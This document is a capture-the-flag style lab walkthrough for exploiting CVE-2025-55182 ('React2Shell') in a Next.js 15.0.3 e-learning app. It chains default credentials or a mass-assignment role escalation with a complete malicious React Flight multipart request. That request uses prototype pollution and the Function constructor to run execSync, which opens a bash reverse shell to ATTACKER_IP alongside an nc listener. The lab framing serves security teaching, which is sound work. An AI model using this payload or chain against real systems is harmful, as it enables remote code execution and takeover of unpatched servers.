# Lab Walkthrough: React2Shell (CVE-2025-55182)

## 1. Objective
The goal of this lab is to exploit **CVE-2025-55182 (React2Shell)**, a critical insecure deserialization vulnerability in Next.js 15.0.3 and React 19.0.0-rc. The attack involves bypassing authentication middlewares by combining session hijacking (or mass assignment) with a malformed React Flight protocol payload to achieve Remote Code Execution (RCE).

**Attack Chain:** Get Lecturer Session → Extract Action ID → React2Shell (RCE) → Reverse Shell

## 2. Reconnaissance
- **Target URL:** `http://TARGET_IP:3000`
- **Goal:** Identify the technology stack and potential entry points.
- **Findings:**
  - Headers and JS Bundles indicate **Next.js 15.0.3 / React 19.0.0-rc**.
  - A quick search in CVE databases reveals **CVE-2025-55182**, an insecure deserialization vulnerability in `decodeReply`.
  - The application uses Server Actions, which are the primary attack surface for React2Shell.

## 3. Stage 1: Authentication & Authorization

To exploit Server Actions protected by Next.js middleware, the attacker needs a valid session cookie for an authorized role (in this case, `LECTURER`).

### Option A: Use Default Credentials
1. Navigate to `/login`.
2. Login as `lecturer@elearning.com` with password `password123`.

### Option B: Escalate from Student (Mass Assignment)
1. Register a new `STUDENT` account.
2. Intercept the "Save Changes" request in Profile Settings.
3. Inject `"role": "LECTURER"` into the JSON body. The backend `deepMerge` function merges this into the user record.
4. Re-login to get a new session token with `LECTURER` privileges.

## 4. Stage 2: Gathering the Action ID

React2Shell requires a valid **Next-Action ID** to instruct the server to deserialize the payload.

1. As a Lecturer, navigate to `/lecturer/assignments`.
2. Open Browser DevTools (F12) -> Elements.
3. Look for the "Create Assignment" form.
4. Find the hidden input field: `<input type="hidden" name="action_id" value="[ACTION_ID]">`.
5. Note the 40-character hex string (e.g., `b6261487e7b81aaab2440e397a356732cad9e342`).

## 5. Stage 3: Exploiting React2Shell (CVE-2025-55182)

The attacker crafts a malicious `multipart/form-data` request that tricks the React Flight deserializer (`decodeReply`) into evaluating arbitrary JavaScript via Prototype Pollution and the Global Function Constructor.

### 5.1 Prepare the C2 Listener
On the attacker machine, open a terminal:
```bash
nc -lvnp 4444
```

### 5.2 Craft the Payload in Burp Suite
Open the Repeater tab and create a new POST request to the protected route:

```http
POST /lecturer/assignments HTTP/1.1
Host: TARGET_IP:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: [INSERT_ACTION_ID_HERE]
Cookie: authjs.session-token=[INSERT_LECTURER_TOKEN_HERE]
Content-Length: 790

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

### 5.3 Technical Breakdown

| Payload Component | Purpose |
|-------------------|---------|
| `Next-Action` Header | Tells Next.js to route the request to the React Flight deserializer. |
| `name="0"` JSON | The core exploit payload. |
| `"then": "$1:__proto__:then"` | Pollutes the prototype to make the object a "fake Promise" (Thenable). |
| `_prefix` | Injects the shell command (`child_process.execSync`) before the response. |
| `"get": "$1:constructor:constructor"` | Escapes the sandbox by walking up the prototype chain to access the Global `Function` constructor, which executes the `_prefix` code. |

### 5.4 Execution
1. Send the request in Burp Suite.
2. The server processes the session cookie and allows the request past the middleware.
3. The React Flight deserializer parses the payload, triggering the RCE **before** the actual `createAssignment` action is executed.
4. The server returns a `500 Internal Server Error` with `NEXT_REDIRECT` and the output of your shell command in the `digest` field (if any).
5. The reverse shell connects back to your `nc` listener!

## 6. Conclusion
This lab demonstrates that:
1. Framework-level vulnerabilities like **React2Shell (CVE-2025-55182)** can completely bypass application logic and security measures.
2. Server Actions in Next.js 15.0.3 expose a massive attack surface if not properly patched.
3. Middleware authentication is crucial, but once an attacker gains any valid session (even via other flaws like Mass Assignment), they can exploit framework zero-days effectively.
